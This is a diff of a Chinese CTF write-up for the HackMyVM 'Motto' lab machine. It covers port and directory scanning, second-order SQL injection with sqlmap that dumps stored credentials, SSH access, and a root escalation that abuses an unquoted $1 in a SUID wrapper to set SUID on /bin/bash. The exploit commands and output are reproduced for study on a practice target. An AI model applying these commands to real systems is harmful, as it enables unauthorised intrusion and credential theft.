@@ -1,5 +1,11 @@
 # Motto
 
+![image-20260413203057898](Motto/image-20260413203057898.png)
+
+| 靶机名称 |  作者  | 难度 |   平台   |
+| :------: | :----: | :--: | :------: |
+|  Motto   | Yliken | easy | HackmyVM |
+
 ## 信息收集
 
 ### 端口扫描
@@ -84,7 +90,7 @@ SF:0charset=utf-8\r\nDate:\x20Mon,\x2013\x20Apr\x202026\x2007:53:50\x20GMT
 SF:\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"zh-CN\">\r\n<head>\r\n\x2
 SF:0\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\r\n\x20\x20\x20\x20<title
 SF:>Mottos</title>\r\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
-SF:\"/static/css/index\.css\"\x20/>\r\n\x20\x20\x20\x20<style>\r\n\x20\x20
+SF:\"/static/css/index\.css\"\r\n\x20\x20\x20\x20<style>\r\n\x20\x20
 SF:\x20\x20\x20\x20\x20\x20\x20\r\n\x20\x20\x20\x20\x20\x20\x20\x20\.top-r
 SF:ight-auth\x20{\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posit
 SF:ion:\x20fixed;\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\
@@ -122,7 +128,7 @@ Nmap done: 1 IP address (1 host up) scanned in 84.56 seconds
 * 80 `http    Apache httpd 2.4.62 ((Debian))`
 * 9090 `http    Golang net/http server`
 
-### web目录枚举 & web 应用分析
+### Web 目录枚举与应用分析
 
 80 端口目录枚举：
 
@@ -153,13 +159,13 @@ Finished
 ===============================================================
 ```
 
-有用信息：80端口存在index.php，对 index.php 文件进行分析。
+有用信息：80 端口存在 `index.php`，值得进一步分析。
 
-80 端口的 http应用分析：
+80 端口的 Web 应用分析：
 
-`http://192.168.56.151:80/` 的index.php 页面是一个前端游戏，对javascript 和 html 进行分析，并没有发现任何漏洞，或信息泄露。
+`http://192.168.56.151:80/` 的 `index.php` 页面是一个前端小游戏。对 JavaScript 和 HTML 进行简单审查后，未发现明显漏洞或敏感信息泄露。
 
-9090 端口的目录枚举：
+9090 端口目录枚举：
 
 ```shell
 warn@kali:/tmp/123$ gobuster dir -u http://192.168.56.151:9090/ -w /usr/share/wordlists/dirb/common.txt
@@ -186,19 +192,19 @@ Finished
 ===============================================================
 ```
 
-有用信息：存在login和register可访问路由。
+有用信息：发现可访问的 `/login` 和 `/register` 路由。
 
-9090 端口的http web应用分析：
+9090 端口的 HTTP Web 应用分析：
 
-`http://192.168.56.151:9090`是一个包含用户座右铭网站。
+`http://192.168.56.151:9090` 是一个展示用户座右铭的网站。
 
-功能：
+主要功能：
 
-* 查看 各个用户的座右铭。
-* 写 用户自己的座右铭 。
-* 查看用户自己 的 座右铭 。
+* 查看其他用户的座右铭。
+* 编写自己的座右铭。
+* 查看自己发布的座右铭。
 
-用这些功能之前，我们必须先登陆，而我们并没有账户和密码，/register路由注册账户：
+在使用这些功能前需要先登录。由于手里没有现成账号，可以先通过 `/register` 注册一个账户：
 
 ```shell
 # 账户
@@ -207,35 +213,31 @@ Finished
 123456
 ```
 
-通过上面账户密码进行登陆。
+使用上面的账号和密码登录。
 
-`http://192.168.56.151:9090/myinfo` : 查看当前用户的信息，可以更改昵称。
+`http://192.168.56.151:9090/myinfo`：查看当前用户信息，并可修改昵称。
 
-`http://192.168.56.151:9090/mymottos` : 查看当前用户的mottos。
+`http://192.168.56.151:9090/mymottos`：查看当前用户发布的 mottos。
 
-写几个motto，进入`mymottos`目录，可以看到用户自己写的motto:
+先随便写几条 motto，再访问 `/mymottos` 页面，可以看到刚刚发布的内容：
 
 ![image-20260413162703048](Motto/image-20260413162703048.png)
 
-
-
-当我们修改自己的昵称，再进入`mymottos`目录：
+当我们修改自己的昵称后，再次进入 `/mymottos` 页面：
 
 ![image-20260413162820957](Motto/image-20260413162820957.png)
 
+刚才写入的 motto 消失了。
 
+这个现象说明：motto 的展示结果与当前账户昵称有关，后端很可能根据昵称去数据库中查询数据，因此这里可能存在 SQL 注入。
 
-我们刚写的motto 不见了。
+注入点：`/changeNickName` 路由的 `nickname` 参数。
 
-从这个现象可以看出：motto的显示与该账户的昵称有关，我们写入的数据可能放在一个数据库中，可能存在sql注入。
+回显点：`/mymottos` 路由。
 
-注入点：`/changeNickName`路由的`nickname`参数。
+## SQL 注入漏洞验证
 
-响应点：`mymottos`路由
-
-## sql注入漏洞验证
-
-通过抓包获取`/changeNickName`的http请求包：
+通过抓包获取 `/changeNickName` 的 HTTP 请求包：
 
 ```http
 POST /changeNickName HTTP/1.1
@@ -258,7 +260,7 @@ Priority: u=0, i
 nickname=123456
 ```
 
-将其写入request.txt文件中。
+将其写入 `request.txt` 文件中。
 
 ```shell
 warn@kali:/tmp/123$ sqlmap -r request.txt -p nickname --second-url http://192.168.56.151:9090/mymottos --batch
@@ -281,11 +283,11 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 ```
 
-确实存在sql注入漏洞。
+可以确认这里确实存在 SQL 注入漏洞。
 
-## sql注入泄露数据库信息
+## SQL 注入泄露数据库信息
 
-获取表名：
+先枚举数据库中的表：
 
 ```shell
 warn@kali:/tmp/123$ sqlmap -r request.txt -p nickname --second-url http://192.168.56.151:9090/mymottos --batch -tables
@@ -321,7 +323,7 @@ Table: register_infos
 +----------+-------------+
 ```
 
-register_infos 存储的用户名和密码，motto_infos 存储的motto，我们主要查看register_infos表。
+`register_infos` 存储用户名和密码，`motto_infos` 存储 motto，因此这里重点查看 `register_infos` 表。
 
 ```shell
 warn@kali:/tmp/123$ sqlmap -r request.txt -p nickname --second-url http://192.168.56.151:9090/mymottos --batch -D sql -T register_infos -dumps
@@ -339,11 +341,11 @@ Table: register_infos
 +---------+----------+-----------------+-----------------+
 ```
 
-后面两个是我们创建的，前面两个是原来就有的。该靶机存在`22`端口，admin和 redbean 其中肯定有一个可以进行ssh登陆，`admin is no use` 可能提示我们admin无法用于ssh登陆，RedBean 可以尝试一下。
+后面两条是我们自己创建的，前面两条是原本就存在的账号。该靶机开放了 `22` 端口，因此 `admin` 和 `RedBean` 中大概率有一个可以用于 SSH 登录。结合 `admin is no use` 这个提示，基本可以判断 `admin` 不能直接用于 SSH，优先尝试 `RedBean`。
 
 ## 初始访问
 
-linux 的 用户一般是小写的，在这里进行登陆的时候，将大写转换为小写：
+Linux 用户名通常使用小写，因此这里将 `RedBean` 转成小写后尝试登录：
 
 ```shell
 warn@kali:/tmp/123$ ssh redbean@192.168.56.151 -p 22
@@ -359,7 +361,7 @@ permitted by applicable law.
 Last login: Mon Apr 13 02:14:16 2026 from 192.168.56.1
 -bash-5.0$ id
 uid=1000(redbean) gid=1000(redbean) groups=1000(redbean)
-# 这是我打了一遍的缘故，所以显示为 -bash-5.0$
+# 这是因为我之前已经打过一遍，所以这里直接显示为 -bash-5.0$
 ```
 
 ## 纵向移动
@@ -443,9 +445,9 @@ lrwxrwxrwx 1 root    root       9 Jul 31  2025 .bash_history -> /dev/null
         +       16      23
 ```
 
-在redbean家目录发现：`.viminfo`，`.viminfo` 是 vim 编辑器的会话状态持久化文件，属于用户本地状态记录文件，用于在vim退出后保存、并在下一次启动时恢复用户的编辑环境和操作历史；可能包含敏感信息。
+在 `redbean` 的家目录中发现了 `.viminfo`。这个文件是 Vim 编辑器的会话持久化文件，常常会记录最近编辑过的文件路径、跳转历史和部分操作痕迹，因此有时能帮助我们快速定位敏感文件。
 
-在`.backup`目录存在：`new.sh和run_newsh.c`。
+根据 `.viminfo` 中留下的痕迹，可以注意到 `.backup` 目录下存在 `new.sh` 和 `run_newsh.c`。
 
 ```shell
 -bash-5.0$ pwd
@@ -521,7 +523,7 @@ echo -e "    Uptime (hours): $((RANDOM%100+1))"
 
 ```
 
-new.sh 的漏洞点：
+`new.sh` 的关键漏洞点如下：
 
 ```shell
 [ -n "$1" ] || exit 1
@@ -529,7 +531,11 @@ new.sh 的漏洞点：
 [ $1 = "flag" ] && chmod +s /bin/bash 
 ```
 
-判断第一个参数的长度是否非0，如果非0，则返回false，执行`exit 1`。判断第一个参数是否为flag，如果为flag，则执行`exit 2`。$1并没有加引号，可能会导致`shell quoting bug`，造成逻辑绕过，使 /bin/bash 会的 suid 权位。
+这三行逻辑分别表示：
+
+1. 如果第一个参数为空，就执行 `exit 1`。
+2. 如果第一个参数恰好等于 `flag`，就执行 `exit 2`。
+3. 第三行本意也是判断 `$1` 是否等于 `flag`，但这里的 `$1` 没有加引号，可能引发参数拆分和 `test` 语义变化，从而造成逻辑绕过，最终触发 `chmod +s /bin/bash`。
 
 ```c
 -bash-5.0$ cat run_newsh.c
@@ -558,7 +564,7 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-run_newsh.c 以获取 root 权限，执行/opt/new.sh + 一个参数。
+`run_newsh.c` 的作用是在获得 root 权限后，携带一个参数去执行 `/opt/new.sh`。
 
 ```
 -bash-5.0$ ls /opt -al
@@ -569,7 +575,7 @@ drwxr-xr-x 19 root root  4096 Jul 31  2025 ..
 -rwsr-sr-x  1 root root 16864 Jul 31  2025 run_newsh
 ```
 
-/opt/run_newsh 存在suid权限。
+可以看到 `/opt/run_newsh` 带有 SUID 权限。
 
 ### 权限提升
 
@@ -606,13 +612,13 @@ Thank you for using the system monitor.
     Uptime (hours): 1
 ```
 
-第一个参数设置为`"! X"` 的原因：
+把第一个参数设置为 `"! x"` 的原因是：
 
-1. 第一个参数不为空，判定被绕过
-2. 第一个参数不等于flag，判定被绕过
-3. `[ ! x = "flag"]`，先进行字符串比较，比较后的结果为false，! 取反，取反后为true，执行`chmod +s /bin/bash`。
+1. 第一个参数非空，因此可以通过第一处判断。
+2. 第一个参数不等于 `flag`，因此也能绕过第二处判断。
+3. 第三行在未加引号的情况下，会被解释成类似 `[ ! x = "flag" ]` 的测试逻辑；`x = "flag"` 为假，前面的 `!` 会把结果取反，于是整个条件成立，最终执行 `chmod +s /bin/bash`。
 
-/bin/bash 就会获得 suid 权位。提权：
+这样一来，`/bin/bash` 就会获得 SUID 位。随后即可提权：
 
 ```shell
 -bash-5.0$ /bin/bash -p
@@ -620,9 +626,9 @@ bash-5.0# id
 uid=1000(redbean) gid=1000(redbean) euid=0(root) egid=0(root) groups=0(root),1000(redbean)
 ```
 
-uid 是 rebbean，当前实际上用的还是root `(euid=0(root))`.
+这里虽然 `uid` 仍然是 `redbean`，但实际生效的是 `euid=0(root)`，因此已经具备 root 权限。
 
-## 获取flag
+## 获取 flag
 
 ```shell
 bash-5.0# cat user.txt
@@ -633,32 +639,32 @@ flag{796f75676574726f6f74627574[hidden]
 
 ## 总结
 
-核心的攻击链是：
+核心攻击链如下：
 
-1. 端口扫描发现`22 80 9090`端口，其中`9090`为主要的突破口。
-2. 在web功能点发现`/changeNickName`存在 SQL 注入，结合`sqlmap -r request.txt -p nickname --second-url` 成功验证并利用。
-3. 通过注入读取数据库表`register_infos`，获取到可用的账号密码。
-4. 根据linux 用户名通常为小写的特点，使用`redbean`成功通过ssh登陆。
-5. 登陆后继续枚举，发现`/opt/run_newsh`会调用`/opt/new.sh`，而脚本中存在危险判断：`[ $1 = "flag" ] && chmod +s /bin/bash`
-6. 由于`$1` 未加 引号，存在参数拆分问题，传入`"! x"`后可使判断结果为真，从而使`/bin/bash` 添加SUID位。
-7. 通过`/bin/bash -p`获取root权限，以root权限读取用户和flag。
+1. 端口扫描发现 `22`、`80`、`9090` 三个端口，其中 `9090` 是主要突破口。
+2. 在 Web 功能测试中发现 `/changeNickName` 存在 SQL 注入，并结合 `sqlmap -r request.txt -p nickname --second-url` 完成验证和利用。
+3. 通过注入读取 `register_infos` 表，拿到可用账号和密码。
+4. 根据 Linux 用户名通常为小写的习惯，使用 `redbean` 成功通过 SSH 登录。
+5. 登录后继续枚举，发现 `/opt/run_newsh` 会调用 `/opt/new.sh`，而脚本中存在危险判断：`[ $1 = "flag" ] && chmod +s /bin/bash`。
+6. 由于 `$1` 没有加引号，存在参数拆分问题，传入 `"! x"` 后可使判断结果为真，从而给 `/bin/bash` 添加 SUID 位。
+7. 通过 `/bin/bash -p` 获取 root 权限，并读取用户 flag 和 root flag。
 
-本靶机的重点：
+本靶机的重点主要有两个：
 
-* sql 注入利用链 ：功能测试、通过sqlmap验证sql注入，再通过sqlmap获取数据库内容。
-* shell 脚本：`"$1"`和`$1` 的区别，未加引号的变量会被linux分割，导致本来的字符串比较语句变成可被绕过的条件判断。
+* SQL 注入利用链：先做功能测试，再用 `sqlmap` 验证注入点，最后进一步导出数据库内容。
+* Shell 脚本细节：`"$1"` 和 `$1` 的区别非常关键；变量未加引号时，可能被 shell 再次拆分，导致原本安全的字符串比较变成可被绕过的条件判断。
 
 ### 杂谈
 
-上面的总结是ai教我写的，学习一下写复盘的写法。
+上面的总结部分是 AI 帮我整理的，我也顺便借这个机会学习一下复盘文章的写法。
 
-我对于系统信息的枚举、web应用漏洞的分析、sqlmap工具的使用并不熟练，我对于信息的收集以及思路得到了一些提升。
+我自己对系统信息枚举、Web 应用漏洞分析以及 `sqlmap` 的使用还不算熟练，但这次练习确实让我在信息收集和利用思路上都有了一些提升。
 
 ### sqlmap
 
-* -r 用来让 sqlmap 从文件里读取原始 HTTP 请求
+* `-r` 用来让 `sqlmap` 从文件中读取原始 HTTP 请求。
 
-  request.txt 里通常是这种原始请求：
+  `request.txt` 里通常是这种原始请求：
 
 ```http
 POST /login HTTP/1.1 
@@ -668,45 +674,45 @@ Cookie: PHPSESSID=abc123
 Content-Type: application/x-www-form-urlencoded username=admin&password=123456
 ```
 
-* -p 是用来指定只测试哪些参数的
+* `-p` 用来指定只测试哪些参数。
 
   例子：
 
-  * 只测id
-    - sqlmap -u "http://target/item.php?id=1&cat=2" -p id
-  * 同时测id和cat
-    - sqlmap -u "http://target/item.php?id=1&cat=2" -p "id,cat"
-  * 测id和请求头User-Agent
-    - sqlmap -u "http://target/item.php?id=1" -p "id,user-agent"
+  * 只测 `id`
+    - `sqlmap -u "http://target/item.php?id=1&cat=2" -p id`
+  * 同时测 `id` 和 `cat`
+    - `sqlmap -u "http://target/item.php?id=1&cat=2" -p "id,cat"`
+  * 测 `id` 和请求头 `User-Agent`
+    - `sqlmap -u "http://target/item.php?id=1" -p "id,user-agent"`
 
-* --second-url 用来处理 **二阶 SQL 注入**
+* `--second-url` 用来处理 **二阶 SQL 注入**。
 
-  - 你的注入点在 **A 页面** 提交
-  - 但注入结果要到 **B 页面** 才能看到
-  - --second-url 就是告诉 sqlmap：**每次往 A 打 payload 后，再去访问这个 B 页面判断结果**
+  - 注入点在 **A 页面** 提交。
+  - 但注入结果要到 **B 页面** 才能看到。
+  - `--second-url` 的作用就是告诉 `sqlmap`：**每次往 A 页面打 payload 后，再访问 B 页面来判断结果。**
 
+* `--second-req` 也可以用来处理 **二阶 SQL 注入**。
 
-* --second-req 是用来处理 **二阶 SQL 注入** 
-
-  - 第二步请求比较复杂，需要完整请求包
-  - 适合第二个页面需要：
+  - 当第二步请求比较复杂时，就需要提供完整请求包。
+  - 适用于第二个页面需要以下信息的情况：
     - Cookie
     - POST 数据
     - 特殊 Header
     - CSRF Token
     - 自定义 Referer
-    - JSON body
+    - JSON Body
     - 特定请求方法
 
   **典型使用方式**
+
   假设：
 
-  - 第一个请求：提交昵称 /changeNickName
-  - 第二个请求：查看昵称展示页 /mymottos
+  - 第一个请求：提交昵称 `/changeNickName`
+  - 第二个请求：查看昵称展示页 `/mymottos`
 
   你可以准备两个文件：
 
-  request.txt：注入入口请求
+  `request.txt`：注入入口请求
 
   ```http
   POST /changeNickName HTTP/1.1 
@@ -715,7 +721,7 @@ Content-Type: application/x-www-form-urlencoded username=admin&password=123456
   Content-Type: application/x-www-form-urlencoded nickname=123456 
   ```
 
-  second.txt：结果查看请求
+  `second.txt`：结果查看请求
 
   ```http
   GET /mymottos HTTP/1.1 
@@ -731,27 +737,26 @@ Content-Type: application/x-www-form-urlencoded username=admin&password=123456
 
   **执行流程**
 
-  1. sqlmap 修改 request.txt 里的 nickname 参数，插入 payload
-  2. 发请求到 /changeNickName
-  3. 再读取 second.txt
-  4. 访问 /mymottos
-  5. 从 /mymottos 的响应里判断 payload 是否生效
+  1. `sqlmap` 修改 `request.txt` 里的 `nickname` 参数并插入 payload。
+  2. 向 `/changeNickName` 发起请求。
+  3. 再读取 `second.txt`。
+  4. 访问 `/mymottos`。
+  5. 从 `/mymottos` 的响应中判断 payload 是否生效。
 
-### shell 基础知识
+### Shell 基础知识
 
-- [ ... ]
-  - 这是 shell 里的 test 命令写法
-  - 用来做字符串、数字、文件等条件判断
-  - 注意：[ 和 ] 两边都要有空格
+- `[ ... ]`
+  - 这是 shell 中 `test` 命令的常见写法。
+  - 用来做字符串、数字、文件等条件判断。
+  - 注意：`[` 和 `]` 两边都要有空格。
 
-* $1
-  * 表示脚本的**第 1 个位置参数**
+* `$1`
+  * 表示脚本的 **第 1 个位置参数**。
 
   * 比如执行：
 
-    `./test.sh hello `
+    `./test.sh hello`
 
-    那么$1就是hello
+    那么 `$1` 就是 `hello`。
 
-* 在bash中，`"$var"`可以防止变量展开后被shell再次拆分或当成通配符处理。
-
+* 在 Bash 中，`"$var"` 可以防止变量展开后被 shell 再次拆分，或者被当成通配符处理。
